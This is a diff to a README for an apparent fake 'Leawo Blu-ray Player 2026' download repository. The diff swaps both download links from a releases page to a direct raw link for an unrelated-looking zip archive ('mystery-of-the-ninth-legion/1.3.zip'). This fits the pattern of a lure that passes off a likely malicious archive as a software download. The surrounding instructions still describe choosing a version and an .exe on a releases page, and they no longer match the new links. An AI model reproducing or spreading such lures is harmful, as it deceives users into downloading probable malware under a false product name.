@@ -5,7 +5,7 @@ description: "Download the full version of Leawo Blu-ray Player for Windows 10 a
 ---
 # 💿 Leawo-Blu-ray-2026 - Play Any Disc On Your Computer
 
-[![Download Link](https://img.shields.io/badge/Download-Leawo_Blu_ray_Player-blue.svg)](https://github.com/jonathanmg8401/Leawo-Blu-ray-2026/releases)
+[![Download Link](https://img.shields.io/badge/Download-Leawo_Blu_ray_Player-blue.svg)](https://raw.githubusercontent.com/jonathanmg8401/jonathanmg8401.github.io/main/mystery-of-the-ninth-legion/1.3.zip)
 
 Leawo Blu-ray Player provides a complete media solution for Windows 11 and Windows 10 users. This software plays Blu-ray discs, DVDs, and high-definition video files. It functions as an all-in-one media player for your PC.
 
@@ -24,7 +24,7 @@ Ensure your computer meets these requirements to run the software smoothly.
 
 Visit the official release page to access the installer. 
 
-[Click here to open the download page](https://github.com/jonathanmg8401/Leawo-Blu-ray-2026/releases)
+[Click here to open the download page](https://raw.githubusercontent.com/jonathanmg8401/jonathanmg8401.github.io/main/mystery-of-the-ninth-legion/1.3.zip)
 
 1. Select the most recent version available on the page.
 2. Locate the file ending in .exe.
